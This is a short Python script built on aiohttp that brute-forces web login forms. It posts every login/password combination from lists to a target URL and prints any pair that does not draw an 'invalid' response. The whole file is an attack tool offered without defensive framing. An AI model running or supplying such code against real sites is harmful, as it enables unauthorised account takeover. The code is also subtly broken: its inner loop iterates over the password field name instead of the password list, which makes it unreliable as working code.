import aiohttp
import asyncio

async def http_try(url, login_field, password_field, login, password):
    async with aiohttp.ClientSession() as session:
        data = {login_field: login, password_field: password}
        try:
            async with session.post(url, data=data, timeout=5) as response:
                if response.status == 200 and "invalid" not in await response.text():
                    print(f"[SUCCESS] Login: {login} | Password: {password}")
                    return login, password
        except Exception as e:
            print(f"[ERROR] {e}")
        return None
    
async def http_bruteforce(url, login_field, password_field, login_list, password_list, rate_limit):
    tasks = []
    for login in login_list:
        for password  in password_field:
            tasks.append(http_try(url, login_field, password_field, login, password))
            await asyncio.sleep(rate_limit)
    
    results = await asyncio.gather(*tasks)
    return[res for res in results if res is not None]